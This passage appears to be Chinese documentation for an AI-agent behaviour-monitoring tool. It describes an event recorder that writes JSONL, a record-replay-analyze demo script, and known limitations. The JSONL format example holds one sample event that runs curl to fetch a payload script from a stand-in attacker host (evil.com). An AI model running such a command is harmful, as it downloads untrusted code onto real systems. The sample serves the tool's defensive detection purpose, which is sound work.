### 1.3 EventRecorder 功能说明

`EventRecorder` 是一个**透明中间件**，可将任意 `ICollector.start()` 产出的 `RawEvent` 流实时录制为 JSONL 文件。

**核心特性**：

| 特性 | 说明 |
|------|------|
| 透明传递 | 包裹迭代器，逐条写入后原样 yield，不修改不过滤 |
| 实时落盘 | 每条事件写入后立即 `flush()`，进程中断不丢数据 |
| 格式兼容 | 输出格式与 `FileReplayCollector._load_jsonl()` 完全一致 |
| 白盒友好 | 支持 `#` 注释行标注录制元信息 |
| 三种用法 | 包裹迭代器 / 手动写入 / 上下文管理器 |

**关键设计**：EventRecorder 不实现 `ICollector` 接口，它是一个独立的工具类，可以嵌入到任何采集器和 observer_core 处理链路之间。

### 1.4 record_and_replay.py 功能说明

端到端演示脚本，实现完整的三阶段工作流：

- **Phase 1 [录制]**：模拟 AGENT 运行，实时录制事件到 JSONL 文件
- **Phase 2 [回放]**：通过 FileReplayCollector 加载录制文件
- **Phase 3 [分析]**：经过 observer_core 全链路处理，输出风险分析报告和模拟阻断结果

内置两种模拟场景（`malicious` / `normal`），也支持对已有录制文件直接回放分析。

## 二、录制-回放工作流使用指南

### 2.1 完整流程

```
Phase 1: RECORD（录制）
────────────────────────
外部 AGENT 运行
    ↓ 产生事件（eBPF/strace/自定义探针/模拟数据）
EventRecorder
    ↓ 实时写入 JSONL 文件（每条 flush）
录制文件: output/recorded/session.jsonl

Phase 2: REPLAY（回放）
────────────────────────
录制文件
    ↓ FileReplayCollector.load_data_file()
FileReplayCollector.start() → yield RawEvent

Phase 3: ANALYZE（分析）
────────────────────────
RawEvent 流
    ↓ EventNormalizer → RuleEngine → RiskScorer → DecisionEngine
    ↓ BlockingCoordinator → AuditLogger + BehaviorGraph
输出:
    - 风险分析报告 (Markdown)
    - 行为图谱 (JSON)
    - 审计日志 (JSONL)
    - 模拟阻断结果
```

### 2.2 record_and_replay.py 使用方法

**命令行参数**：

| 参数 | 默认值 | 说明 |
|------|--------|------|
| `--output` | `output/recorded/session.jsonl` | 录制文件输出路径 |
| `--replay-only` | `None` | 仅回放模式：指定已有 JSONL 文件路径 |
| `--scenario` | `malicious` | 内置场景类型：`malicious`（恶意）/ `normal`（正常） |
| `--agent-id` | `target-agent` | Agent 标识 |
| `--output-base` | `output` | 分析报告输出根目录 |
| `--config` | `config.yaml` | 配置文件路径 |

**示例命令**：

```bash
# 恶意 AGENT 场景：完整录制 + 回放 + 报告
python3 record_and_replay.py --scenario malicious

# 正常 AGENT 场景
python3 record_and_replay.py --scenario normal

# 仅回放已有录制文件
python3 record_and_replay.py --replay-only output/recorded/session.jsonl

# 自定义输出路径和 Agent ID
python3 record_and_replay.py --output output/recorded/my_agent.jsonl --agent-id my-real-agent
```

### 2.3 EventRecorder Python API

**方式一：包裹迭代器（推荐）**

```python
from collector.event_recorder import EventRecorder

# 与任意 ICollector 配合使用
recorder = EventRecorder("output/recorded/session.jsonl", agent_id="my-agent")
recorder.start()

# record() 是透明中间件：逐条写入 JSONL 后原样 yield
for raw_event in recorder.record(collector.start()):
    normalized = normalizer.normalize(raw_event)
    # ... 继续送入 observer_core 处理链路

# 迭代器耗尽时自动 stop()
```

**方式二：手动逐条写入**

```python
recorder = EventRecorder("output/recorded/session.jsonl")
recorder.start()
recorder.write(raw_event_1)
recorder.write(raw_event_2)
count = recorder.stop()  # 返回录制总数
```

**方式三：上下文管理器**

```python
with EventRecorder("output/recorded/session.jsonl", agent_id="my-agent") as recorder:
    for raw_event in recorder.record(collector.start()):
        process(raw_event)
```

**与真实 AGENT 采集器集成**：

```python
# 假设你有一个自定义的 ICollector 实现
class MyAgentCollector(ICollector):
    def start(self):
        for event in my_agent.get_events():
            yield convert_to_raw_event(event)

# 录制 + 实时处理
collector = MyAgentCollector(config)
recorder = EventRecorder("output/recorded/agent_session.jsonl", agent_id="real-agent")
recorder.start()

for raw_event in recorder.record(collector.start()):
    normalized = normalizer.normalize(raw_event)
    # ... observer_core 全链路处理
# 录制文件已就绪，可随时用 FileReplayCollector 回放
```

### 2.4 录制输出 JSONL 文件格式

**文件结构**：

```jsonl
# Recorded by EventRecorder at 2026-07-31T14:55:12
# agent_id: target-agent
# Scenario: recorded session
{"event_id": "rec_001", "timestamp_ns": 1718092800000000000, "event_type": "exec", "pid": 50001, "ppid": 50000, "agent_id": "target-agent", "agent_framework": "recorded", "executable": "/usr/bin/curl", "arguments": ["curl", "-s", "https://evil.com/payload.sh"], "file_path": null, "file_op": null, "remote_addr": null, "remote_port": null, "protocol": null}
{"event_id": "rec_002", "timestamp_ns": 1718092800100000000, "event_type": "net_conn", "pid": 50001, "ppid": 50000, "agent_id": "target-agent", "agent_framework": "recorded", "executable": null, "arguments": null, "file_path": null, "file_op": null, "remote_addr": "192.168.1.100", "remote_port": 443, "protocol": "TCP"}
```

**字段规范**（与 RawEvent 完全一致）：

| 字段名 | 类型 | 必填 | 说明 |
|--------|------|:---:|------|
| `event_type` | string | **是** | `"exec"` / `"file_open"` / `"net_conn"` |
| `pid` | int | 否 | 进程 ID（默认 0） |
| `ppid` | int | 否 | 父进程 ID（默认 0） |
| `timestamp_ns` | int | 否 | 纳秒时间戳（默认 0） |
| `agent_id` | string | 否 | Agent 标识（默认取录制器配置值） |
| `agent_framework` | string | 否 | 数据来源标识（默认 `"recorded"`） |
| `executable` | string | 否 | 可执行文件路径（exec 事件） |
| `arguments` | string[] | 否 | 命令行参数列表（exec 事件） |
| `file_path` | string | 否 | 文件路径（file_open 事件） |
| `file_op` | string | 否 | 文件操作（file_open 事件）：`read`/`write`/`delete`/`rename`/`chmod` |
| `remote_addr` | string | 否 | 远程地址（net_conn 事件） |
| `remote_port` | int | 否 | 远程端口（net_conn 事件） |
| `protocol` | string | 否 | 传输协议（net_conn 事件）：`TCP`/`UDP` |

> **最小必填字段**仅为 `event_type`，其余字段均有默认值。

## 四、注意事项

### 4.1 Windows 与 Linux 环境差异

| 差异项 | Windows | Linux |
|--------|---------|-------|
| 采集模式 | simulation / file_replay | simulation / strace / ebpf / file_replay |
| eBPF 支持 | 不支持 | 需内核 5.5+ 和 BTF |
| strace 支持 | 不支持 | 需安装 strace |
| 编码 | GBK（默认），需注意 Unicode | UTF-8（默认） |
| 管道 | Named Pipe (`\\.\pipe\...`) | FIFO (`/tmp/observer/...`) |
| C++ Probe | MSVC 编译 | GCC/Clang 编译 |
| EventRecorder | 完全可用 | 完全可用（跨平台） |

### 4.2 已知限制

| 限制 | 说明 | 影响 |
|------|------|------|
| `main.py --mode` 不含 `file_replay` | CLI choices 为 `["auto", "simulation", "strace", "ebpf"]` | 需通过 config.yaml 或编程接口使用 file_replay |
| `loop` / `time_scale` 未实现 | config.yaml 有配置但代码未实现循环回放和时间缩放 | 仅影响 FileReplayCollector 的回放控制 |
| 三入口未集成 file_replay | main.py/demo.py/app.py 无专用路由 | 通过工厂函数可正常使用 |
| eBPF 第一版无阻断 | send_command() 返回 False | 仅观测，不可阻断 |
| report_exporter.py section_num Bug | 无 agent_summaries 时可能 UnboundLocalError | 由 main.py try-except 兜底，不影响核心功能 |

### 4.3 EventRecorder 使用注意

1. **文件覆盖**：EventRecorder 默认以写入模式打开文件，重复录制会覆盖已有文件
2. **flush 策略**：每条事件写入后立即 flush，频繁写入可能影响高吞吐场景性能
3. **时间戳**：录制的时间戳来自原始事件，回放时不会自动推进 VirtualClock（需外部控制）
4. **agent_id 补全**：如原始事件未指定 agent_id，EventRecorder 会使用构造时传入的默认值
